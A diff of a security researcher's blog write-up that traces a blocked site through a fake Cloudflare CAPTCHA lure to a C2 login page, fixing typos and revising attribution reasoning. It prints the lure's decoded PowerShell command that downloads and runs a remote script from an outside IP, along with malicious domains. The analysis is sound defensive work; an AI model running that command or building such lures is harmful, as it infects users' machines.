@@ -1,16 +1,17 @@
-# Dead Site to C2 Server Discovery
+# Dead Site to C2 Server Discovery - 20260314
 
 Last month I was asked to look into a site that got blocked by an internet provider.<br>
 The site, "dkaksdaksortor[.]com" was dead upon access. So I was tasked to figure out what was on this site that caused it to be blocked.
 
 Since the site was dead, my first instinct was to check out the Wayback Machine to see if any bots had crawled the page. It was then that I noticed the page was redirecting me to a "mvjfkakfkfkaiai[.]com". I'm a month late in documenting this case, but as of typing, Wayback Machine doesn't redirect to that page anymore.<br>
-(Either that, or I honestly can't remember how I found the redirect. But I did somehow or else this investigation would have ended there!)
+The most plausible reason why Wayback Machine redirected to the new site in the first place was because its DNS pointed to a small cloud storage like an S3 bucket (Amazon) or an R2 bucket (Cloudflare). Then when Wayback's crawler visited the site, it was forwarded to mvjfkakfkfkaiai[.]com instead.<br>
+As for why it doesn't redirect anymore, we can guess that the bucket simply got deleted.
 
 Accessing mvjfkakfkfkaiai[.]com leads you to a 404 error.
 
 ![alt text](images/DeadtoC2images/error404.png)
 
-That's interesting. The sever exists, so what's on it?<br>
+That's interesting. The server exists, so what's on it?<br>
 A hunch told me to check Wayback Machine again and check if it got crawled. And lo and behold, we got some URL prefix results! (As of typing, the number of .js files has increased.)
 
 ![alt text](images/DeadtoC2images/mvj_wayback.png)
@@ -28,10 +29,10 @@ For this documentation, I'll only be focusing on fasfttt.js.
 That is a whole lot of obfuscated code. But if we look a little closer we can see some base64 hidden in there (highlighted area).<br>
 Throwing that into a decoder, it came out to: "https[:]//www[.]windowwashingexpert[.]com/lma.php".
 
-I did briefly attempt to deobuscate the javascript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externaling loading the php site we found, it was probably gathering data like hostname and timestamp.
+I did briefly attempt to deobfuscate the javascript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.
 
 So now that we have this suspicious php webshell, what do we do with it? The javascript is already suspicious enough, but we still don't have anything to deem it malicious.<br>
-This is where Burp comes in handly. We'll intercept and see what we can pull from it.
+This is where Burp comes in handy. We'll intercept and see what we can pull from it.
 
 As of typing, this link now returns a 404. However, it was online at the time which you'll see the timestamp in the screenshot below. The following screenshots were taken as I was investigating.
 
@@ -55,7 +56,7 @@ In the first image we see that this is a CAPTCHA request. The "Verify you are hu
 
 In the second image we get an idea of what happens when we click the checkbox.<br>
 First we get an error for "Unusual Web Traffic Detected" so we need you do the following 3 steps of pressing "Win +R" and copy and pasting whatever command is on your clipboard.<br>
-At the very bottom we see a code for your computer auto copying on click and at the top of that image we have the variable copyCommand to equal a base64. This base64 we found at the very top our our Burp results.<br>
+At the very bottom we see a code for your computer auto copying on click and at the top of that image we have the variable copyCommand to equal a base64. This base64 we found at the very top our Burp results.<br>
 Lets decode that.<br>
 Base64: cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5HUkUp<br>
 Decoded: powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)
@@ -67,7 +68,7 @@ Lets dissect that.<br>
 ・iex(irm IP/file) downloads and immediately executes a remote script from the IP
 
 Well, I think we have proof now that our suspicious webshell is indeed malicious.<br>
-What we can also assume is that the original dkaksdaksortor[.]com that started this hunt was just another site that hosted malicious javascript pages with infected php webshells that were just imposter Cloudflare CAPTCHA pages.
+What we can also assume is that dkaksdaksortor[.]com was simply a disposable front, a distribution site likely spread through phishing or malicious ads, designed to funnel victims toward the real infrastructure. The actual malicious javascript was hosted on mvjfkakfkfkaiai[.]com, which in turn loaded the fake Cloudflare CAPTCHA from the PHP webshell on windowwashingexpert[.]com.
 
 But we can do better than that. ....Right?<br>
 What I really wanted was the php code, not the HTML.<br>
@@ -75,7 +76,7 @@ So I consulted with Claude, and was suggested to try a different request in Burp
 
 ![alt text](images/DeadtoC2images/lamaba.png)
 
-Adding to the original /page request, we now have an API key and endpoint. This is our C2 server: lamabamatypod[.]com<br>
+Adding onto the original /page request, we now have an API key and endpoint. This is our C2 server: lamabamatypod[.]com<br>
 And if we go to that page, we find a login.
 
 ![alt text](images/DeadtoC2images/C2login.png)
